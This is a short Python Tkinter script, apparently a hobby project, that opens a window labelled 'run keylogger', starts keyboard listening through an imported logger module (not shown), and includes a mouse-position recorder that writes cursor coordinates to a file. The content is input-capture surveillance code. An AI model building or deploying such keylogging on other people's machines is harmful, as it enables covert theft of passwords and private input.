from logger import listen_to_keyboard
import mouse
from tkinter import *
window=Tk()
window.geometry("400x400")
label=Label(window, text="run keylogger")
label.pack()
positions=set()
def get_mouse_pos():
    positions.add(window.winfo_pointerxy())
    print(positions)
    mouse.write_to_file(positions)
    window.after(100, get_mouse_pos)
#get_mouse_pos()
listen_to_keyboard()
window.mainloop()


